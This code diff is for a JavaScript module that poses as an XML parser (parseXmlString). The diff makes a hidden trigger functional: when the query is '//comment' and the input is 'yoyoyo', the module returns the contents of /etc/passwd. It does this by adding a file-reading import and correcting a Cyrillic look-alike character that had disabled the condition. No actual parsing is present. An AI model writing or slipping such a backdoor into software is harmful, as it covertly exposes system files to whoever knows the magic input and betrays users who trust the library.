@@ -1,14 +1,16 @@
-async function readFile() {
+const { readFile } = require('fs/promises')
+
+async function readFilePw() {
     return await readFile("/etc/passwd", 'utf8');
 }
 
 module.exports.parseXmlString = function(s, o) {
     return {
-        get : function(е) {
+        get : function(e) {
             return {
                 text : async function() {
-                    if (е == "//comment" && s == "yoyoyo") {
-                        return readFile();
+                    if (e == "//comment" && s == "yoyoyo") {
+                        return readFilePw();
                     } else {
                         return "";
                     }
